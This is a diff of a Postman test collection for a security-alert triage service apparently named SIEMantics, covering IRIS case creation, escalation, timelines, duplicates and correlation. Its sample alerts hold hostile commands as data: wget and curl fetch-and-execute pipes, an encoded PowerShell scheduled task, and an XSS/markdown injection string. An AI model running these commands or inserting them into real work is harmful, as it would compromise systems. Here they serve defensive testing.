-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2498,7 +2942,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2564,7 +3008,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2630,7 +3074,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2696,7 +3140,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2762,7 +3206,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2828,7 +3272,7 @@
                   "  const json = pm.response.json();",
                   "  pm.test('alert stored with a valid status and triage result', () => {",
                   "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
-                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.id).to.match(/^ID-\\d+$/);",
                   "    pm.expect(json.triage).to.have.property('is_true_positive');",
                   "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
                   "  });",
@@ -2844,6 +3288,2487 @@
           "response": []
         }
       ]
+    },
+    {
+      "name": "7. IRIS case content (L2 / Lead Analyst)",
+      "description": "Creates IRIS cases that exercise every part of the case content built for L2 analysts and Lead Analysts. The API only returns the case ID/URL (printed to the Postman console), the content itself must be checked in IRIS - each request's description says what to look for.\n\nCheck in IRIS (manually, the API does not return the case content):\n- name: `[SIEMantics ID-<n>] [P1/CRITICAL] <rule> @ <host>`\n- description: verdict + key facts table (rule, MITRE links, host/agent, source IP:port, target user, log source, IoCs) + first L2 steps\n- notes group `SIEMantics ID-<n>` with 5 notes: triage summary, alert details (compliance, MITRE, data.* fields), threat intelligence, investigation checklist (pivot queries, Lead Analyst criteria), raw evidence (full JSON)\n- IOCs with type (ip-any / domain / url / sha256 when extracted by the LLM), description and `siemantics,ID-<n>,T...` tags\n- asset: the agent host (Linux - Server / Windows - Computer), status 'To be done'\n- case severity and tags (`ID-<n>`, `P1`, `severity:critical`, MITRE IDs, tactics)\n- timeline: one event at the Wazuh event time (with its timezone), category = first MITRE tactic (Unspecified without MITRE), linked to the asset and the IOCs, raw log in the raw field, shown in summary and graph",
+      "item": [
+        {
+          "name": "Login (dashboard user)",
+          "id": "b6563d3d-85b7-4245-a92e-87f44a58edbb",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "login"
+              ]
+            },
+            "description": "Sets the siemantics_session cookie used by the rest of the folder.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{ui_username}}\",\n  \"password\": \"{{ui_password}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('session cookie set', () => pm.expect(pm.cookies.has('siemantics_session')).to.be.true);",
+                  "pm.collectionVariables.set('me_id', pm.response.json().id);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Full-featured Linux alert (MITRE x3, compliance, IoCs) -> P1 case",
+          "id": "83b5ba3b-621a-4255-9202-bb386b5e1de2",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Check in IRIS (manually, the API does not return the case content):\n- name: `[SIEMantics ID-<n>] [P1/CRITICAL] <rule> @ <host>`\n- description: verdict + key facts table (rule, MITRE links, host/agent, source IP:port, target user, log source, IoCs) + first L2 steps\n- notes group `SIEMantics ID-<n>` with 5 notes: triage summary, alert details (compliance, MITRE, data.* fields), threat intelligence, investigation checklist (pivot queries, Lead Analyst criteria), raw evidence (full JSON)\n- IOCs with type (ip-any / domain / url / sha256 when extracted by the LLM), description and `siemantics,ID-<n>,T...` tags\n- asset: the agent host (Linux - Server / Windows - Computer), status 'To be done'\n- case severity and tags (`ID-<n>`, `P1`, `severity:critical`, MITRE IDs, tactics)\n- timeline: one event at the Wazuh event time (with its timezone), category = first MITRE tactic (Unspecified without MITRE), linked to the asset and the IOCs, raw log in the raw field, shown in summary and graph",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"iris-full-content\",\n  \"timestamp\": \"2026-10-01T15:42:07.118+0000\",\n  \"rule\": {\n    \"id\": \"100210\",\n    \"level\": 13,\n    \"description\": \"Reverse shell payload downloaded and executed by web server user\",\n    \"groups\": [\n      \"linux\",\n      \"attack\",\n      \"web\",\n      \"audit_command\"\n    ],\n    \"firedtimes\": 2,\n    \"mitre\": {\n      \"id\": [\n        \"T1059.004\",\n        \"T1105\",\n        \"T1071.001\"\n      ],\n      \"tactic\": [\n        \"Execution\",\n        \"Command and Control\"\n      ],\n      \"technique\": [\n        \"Unix Shell\",\n        \"Ingress Tool Transfer\",\n        \"Web Protocols\"\n      ]\n    },\n    \"pci_dss\": [\n      \"10.6.1\",\n      \"11.4\"\n    ],\n    \"gdpr\": [\n      \"IV_35.7.d\"\n    ],\n    \"nist_800_53\": [\n      \"SI.4\",\n      \"AU.6\"\n    ],\n    \"tsc\": [\n      \"CC6.1\",\n      \"CC7.2\"\n    ]\n  },\n  \"agent\": {\n    \"id\": \"007\",\n    \"name\": \"lab-app02\",\n    \"ip\": \"10.64.0.37\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"auditd\"\n  },\n  \"location\": \"/var/log/audit/audit.log\",\n  \"data\": {\n    \"srcip\": \"45.155.205.233\",\n    \"srcport\": \"443\",\n    \"dstip\": \"10.64.0.37\",\n    \"dstuser\": \"www-data\",\n    \"audit\": {\n      \"command\": \"bash\",\n      \"exe\": \"/usr/bin/bash\",\n      \"execve\": {\n        \"a0\": \"bash\",\n        \"a1\": \"-c\",\n        \"a2\": \"wget http://update-check.badcdn.net/s.sh -O- | sh\"\n      }\n    },\n    \"url\": \"http://update-check.badcdn.net/s.sh\",\n    \"sha256\": \"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\"\n  },\n  \"full_log\": \"type=EXECVE msg=audit(1727797327.118:5521): argc=3 a0=\\\"bash\\\" a1=\\\"-c\\\" a2=\\\"wget http://update-check.badcdn.net/s.sh -O- | sh\\\" from 45.155.205.233 sha256=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => pm.expect([202, 502]).to.include(pm.response.code));",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('escalated with an IRIS case', () => {",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.case.case_id).to.be.a('number');",
+                  "  });",
+                  "  pm.collectionVariables.set('case_full', json.case.case_id);",
+                  "  console.log('IRIS case to review: ' + json.case.case_url + ' (' + json.id + ')');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Stored record of the full-featured alert",
+          "id": "7f8e164d-1336-49ab-9c12-d27cc97a4491",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/{{ref_iris_full_content}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "{{ref_iris_full_content}}"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Ha a hivatkozas hianyzik (elozo mappa nem futott), a kerest atugorjuk.",
+                  "const ref = pm.collectionVariables.get('ref_iris_full_content');",
+                  "if (!ref) {",
+                  "  console.warn('ref_iris_full_content is not set - run folders 1-3 first');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "const json = pm.response.json();",
+                  "pm.test('normalized fields stored', () => {",
+                  "  pm.expect(json.source_ip).to.eql('45.155.205.233');",
+                  "  pm.expect(json.severity).to.eql(13);",
+                  "});",
+                  "pm.test('IoCs extracted', () => pm.expect(json.llm_iocs).to.include('45.155.205.233'));",
+                  "const caseId = pm.collectionVariables.get('case_full');",
+                  "if (caseId) {",
+                  "  pm.test('record linked to the IRIS case', () => pm.expect(String(json.iris_case_id)).to.eql(String(caseId)));",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Windows/Sysmon discovery alert (low level) -> not escalated",
+          "id": "55be284b-cd4e-4416-8125-a1331feb2ecc",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Level 3 discovery: the mock engine suppresses it, an LLM may escalate it. The next request escalates it by hand.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"iris-manual-windows\",\n  \"timestamp\": \"2026-10-01T15:50:12.004+0000\",\n  \"rule\": {\n    \"id\": \"92031\",\n    \"level\": 3,\n    \"description\": \"Discovery activity: net.exe used to list domain admins\",\n    \"groups\": [\n      \"windows\",\n      \"sysmon\",\n      \"sysmon_event1\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1087.002\"\n      ],\n      \"tactic\": [\n        \"Discovery\"\n      ],\n      \"technique\": [\n        \"Domain Account\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"012\",\n    \"name\": \"LAB-WS07\",\n    \"ip\": \"10.64.1.57\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"windows_eventchannel\"\n  },\n  \"location\": \"EventChannel\",\n  \"data\": {\n    \"win\": {\n      \"system\": {\n        \"eventID\": \"1\",\n        \"computer\": \"LAB-WS07.lab.local\",\n        \"channel\": \"Microsoft-Windows-Sysmon/Operational\"\n      },\n      \"eventdata\": {\n        \"image\": \"C:\\\\Windows\\\\System32\\\\net.exe\",\n        \"commandLine\": \"net group \\\"Domain Admins\\\" /domain\",\n        \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\",\n        \"user\": \"LAB\\\\j.doe\"\n      }\n    }\n  },\n  \"full_log\": \"Process creation: net group \\\"Domain Admins\\\" /domain (parent cmd.exe, user LAB\\\\j.doe)\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202', () => pm.response.to.have.status(202));",
+                  "pm.test('stored with a status', () => {",
+                  "  pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(pm.response.json().status);",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Escalate the Windows alert manually -> Windows asset, manual-escalation tag",
+          "id": "5625b2bd-da9b-4f79-a6be-ffc49ddbb3c7",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/{{ref_iris_manual_windows}}/escalate",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "{{ref_iris_manual_windows}}",
+                "escalate"
+              ]
+            },
+            "description": "Check in IRIS: description starts with 'Manually escalated by <user>', tags include `manual-escalation`, the asset is LAB-WS07 as 'Windows - Computer', the checklist has the Discovery steps and the data.win.eventdata.* fields are listed in the alert details note."
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Ha a hivatkozas hianyzik (elozo mappa nem futott), a kerest atugorjuk.",
+                  "const ref = pm.collectionVariables.get('ref_iris_manual_windows');",
+                  "if (!ref) {",
+                  "  console.warn('ref_iris_manual_windows is not set - run folders 1-3 first');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('200, 409 if the triage already escalated it, or 502 if IRIS is unreachable', () => {",
+                  "  pm.expect([200, 409, 502]).to.include(pm.response.code);",
+                  "});",
+                  "if (pm.response.code === 200) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('manual escalation recorded', () => {",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(['suppressed', 'needs_review', 'error']).to.include(json.auto_status);",
+                  "    pm.expect(json.escalated_by.username).to.eql(pm.collectionVariables.get('ui_username'));",
+                  "  });",
+                  "  pm.collectionVariables.set('case_windows', json.iris_case_id);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Markdown / HTML in log and agent name -> rendered as code in IRIS",
+          "id": "72d5fdbd-af7e-4cfd-9802-e30983784f6d",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Check in IRIS: the agent name, the data.url field and the log appear literally as code - no image, no clickable link, no heading, the tables are not broken by the `|` characters.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"iris-markdown-injection\",\n  \"rule\": {\n    \"id\": \"100250\",\n    \"level\": 12,\n    \"description\": \"Suspicious download in web request\",\n    \"groups\": [\n      \"web\",\n      \"attack\"\n    ]\n  },\n  \"agent\": {\n    \"id\": \"008\",\n    \"name\": \"web`01 | ![x](http://203.0.113.9/p.png)\",\n    \"ip\": \"10.64.0.38\"\n  },\n  \"data\": {\n    \"srcip\": \"203.0.113.9\",\n    \"url\": \"/x?a=[click](http://203.0.113.9/phish)\"\n  },\n  \"location\": \"/var/log/nginx/access.log\",\n  \"full_log\": \"GET /cgi-bin/x?c=wget http://203.0.113.9/a.sh ``` # Heading | col | [link](http://203.0.113.9/) <img src=x onerror=alert(1)> HTTP/1.1 200\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => pm.expect([202, 502]).to.include(pm.response.code));",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('escalated with an IRIS case', () => {",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.case.case_id).to.be.a('number');",
+                  "  });",
+                  "  pm.collectionVariables.set('case_markdown', json.case.case_id);",
+                  "  console.log('IRIS case to review: ' + json.case.case_url + ' (' + json.id + ')');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Non-UTC Wazuh timestamp (+0200) -> timeline event in local time",
+          "id": "0d176f04-8cde-4a2a-a4f7-dcd4ea5b6508",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Check in IRIS timeline: the event is at 2026-10-01 17:05:44.200 with timezone +02:00 (not converted to UTC), category Persistence, linked to the LAB-SRV03 asset (Windows - Computer).",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"iris-timeline-tz\",\n  \"timestamp\": \"2026-10-01T17:05:44.200+0200\",\n  \"rule\": {\n    \"id\": \"92154\",\n    \"level\": 12,\n    \"description\": \"Scheduled task created to run an encoded PowerShell command\",\n    \"groups\": [\n      \"windows\",\n      \"sysmon\",\n      \"sysmon_event1\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1053.005\"\n      ],\n      \"tactic\": [\n        \"Persistence\"\n      ],\n      \"technique\": [\n        \"Scheduled Task\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"015\",\n    \"name\": \"LAB-SRV03\",\n    \"ip\": \"10.64.1.23\"\n  },\n  \"decoder\": {\n    \"name\": \"windows_eventchannel\"\n  },\n  \"location\": \"EventChannel\",\n  \"data\": {\n    \"win\": {\n      \"eventdata\": {\n        \"image\": \"C:\\\\Windows\\\\System32\\\\schtasks.exe\",\n        \"commandLine\": \"schtasks /create /tn Updater /tr \\\"powershell -enc SQBFAFgA\\\" /sc onlogon\",\n        \"user\": \"LAB\\\\svc_backup\"\n      }\n    }\n  },\n  \"full_log\": \"schtasks /create /tn Updater /tr \\\"powershell -enc SQBFAFgA\\\" /sc onlogon\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => pm.expect([202, 502]).to.include(pm.response.code));",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('escalated with an IRIS case', () => {",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.case.case_id).to.be.a('number');",
+                  "  });",
+                  "  pm.collectionVariables.set('case_tz', json.case.case_id);",
+                  "  console.log('IRIS case to review: ' + json.case.case_url + ' (' + json.id + ')');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "No timestamp, no MITRE -> Unspecified event at receive time (UTC)",
+          "id": "fa26e675-8085-4149-8f65-c6c9bbd7973f",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Check in IRIS timeline: the event time is when SIEMantics received the alert, timezone +00:00, category Unspecified.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"iris-timeline-no-ts\",\n  \"rule\": {\n    \"id\": \"100260\",\n    \"level\": 12,\n    \"description\": \"Payload download from untrusted host\",\n    \"groups\": [\n      \"linux\"\n    ]\n  },\n  \"agent\": {\n    \"id\": \"009\",\n    \"name\": \"lab-app03\",\n    \"ip\": \"10.64.0.39\"\n  },\n  \"data\": {\n    \"srcip\": \"198.51.100.77\"\n  },\n  \"full_log\": \"curl http://198.51.100.77/x.sh | sh\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202 (escalated) or 502 (IRIS unreachable)', () => pm.expect([202, 502]).to.include(pm.response.code));",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('escalated with an IRIS case', () => {",
+                  "    pm.expect(json.status).to.eql('escalated');",
+                  "    pm.expect(json.case.case_id).to.be.a('number');",
+                  "  });",
+                  "  pm.collectionVariables.set('case_no_ts', json.case.case_id);",
+                  "  console.log('IRIS case to review: ' + json.case.case_url + ' (' + json.id + ')');",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Duplicate Wazuh alert_id (1st)",
+          "id": "df914df2-9335-4c46-a102-468c1363ba52",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"iris-duplicate\",\n  \"rule\": {\n    \"id\": \"5501\",\n    \"level\": 2,\n    \"description\": \"User login\"\n  },\n  \"full_log\": \"first\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202', () => pm.response.to.have.status(202));",
+                  "pm.collectionVariables.set('dup_first', pm.response.json().id);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Duplicate Wazuh alert_id (2nd) -> new display ID",
+          "id": "37c2064d-23e4-4732-a34d-955855288c12",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"iris-duplicate\",\n  \"rule\": {\n    \"id\": \"5501\",\n    \"level\": 2,\n    \"description\": \"User login\"\n  },\n  \"full_log\": \"second\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202', () => pm.response.to.have.status(202));",
+                  "pm.test('distinct display ID for the same Wazuh alert_id', () => {",
+                  "  pm.expect(pm.response.json().id).to.not.eql(pm.collectionVariables.get('dup_first'));",
+                  "});",
+                  "pm.collectionVariables.set('dup_second', pm.response.json().id);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Get by duplicated Wazuh alert_id -> latest record",
+          "id": "8a807c32-9968-4724-ba5c-c885c6e7d50b",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/iris-duplicate",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "iris-duplicate"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('latest record is returned', () => {",
+                  "  pm.expect(pm.response.json().display_id).to.eql(pm.collectionVariables.get('dup_second'));",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Get first duplicate by display ID -> exact record",
+          "id": "76dedf29-fa6f-4c58-83f7-d026c280ec32",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts/{{dup_first}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts",
+                "{{dup_first}}"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('the first record, not the latest', () => {",
+                  "  pm.expect(pm.response.json().display_id).to.eql(pm.collectionVariables.get('dup_first'));",
+                  "});"
+                ]
+              }
+            }
+          ],
+          "response": []
+        }
+      ]
+    },
+    {
+      "name": "8. Correlation (same source IP + similar alert)",
+      "description": "Alerts from the same source IP (`data.srcip`, the agent IP does not count) are added to the existing open IRIS case if they are similar: same Wazuh rule ID, or a shared MITRE technique (sub-techniques count as their base technique, e.g. T1110.001 ~ T1110.003), within CORRELATION_WINDOW_HOURS (default 24). A closed case is never extended - a new case is opened instead.\n\nEach run uses a fresh random source IP (198.18.x.y), so earlier runs do not interfere. The assertions only run when the first alert was escalated (with an LLM the verdicts may differ; IRIS down -> 502).",
+      "item": [
+        {
+          "name": "Login (dashboard user)",
+          "id": "21f5d565-0f41-4849-b5c3-bdc1f3688b3b",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "login"
+              ]
+            },
+            "description": "Sets the siemantics_session cookie used by the rest of the folder.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{ui_username}}\",\n  \"password\": \"{{ui_password}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('session cookie set', () => pm.expect(pm.cookies.has('siemantics_session')).to.be.true);",
+                  "pm.collectionVariables.set('me_id', pm.response.json().id);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Brute force from a fresh source IP (rule 5763, T1110.001) -> new case",
+          "id": "eebe3d5c-7a09-433c-a39e-9f21253e29f1",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Opens the case that the next similar alerts from the same IP are added to.",
+            "body": {
+              "mode": "raw",
